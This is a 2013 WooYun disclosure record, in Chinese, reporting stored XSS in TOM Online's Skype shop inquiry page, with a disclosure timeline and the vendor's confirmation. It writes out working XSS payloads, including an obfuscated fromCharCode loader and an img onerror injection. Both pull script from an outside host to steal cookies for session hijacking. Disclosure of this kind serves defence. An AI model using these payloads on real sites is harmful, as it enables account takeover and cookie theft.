{"id": 9677, "wybug_id": "wooyun-2013-033011", "wybug_title": "tom在线的Skype商城存在储存xss（完美登陆用户cookie）", "wybug_corp": "TOM在线", "wybug_author": "mango", "wybug_date": "2013-07-31 16:55", "wybug_open_date": "2013-09-14 16:55", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-14：\t细节向公众公开  简要描述： 这个xss就坑爹了。。。 详细说明：  http://shop.skype.tom.com/在这个商城随便找一个商品然后咨询该商品\n\n\n\n开始我试了很多的xss,但是只有一个可弹窗\n“><img src=1 onerror=alert(1);>\n然后呢我转义一下\n<img/src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,46,99,111,47,49,84,67,122,108);document.body.appendChild(window.s)})()>\n坑爹了 字符太多了 \n\n这里要感谢一下@钱途 基友的帮助他说可以绕过的给了以下代码\n<img src=x onerror=document.body.appendChild(createElement('script')).src='http://xxxxx'>\n然后我就xss了果然成功了\n\n然后坐等收取cookie我没有等直接用自己的号登陆试试了。结果可想而知成功收到cookie\n\n然后登陆\n\n完美登陆的有木有。。。如果商家回复或者管理员进入咨询页面那么可想而知后果。。   漏洞证明：  \n\n完美登陆   修复方案：  景浩我等着你的签名照呢。   版权声明：转载请注明来源 mango@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-07-31 17:39 厂商回复： 非常感谢您对TOM在线的帮助，我们会尽快做出处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}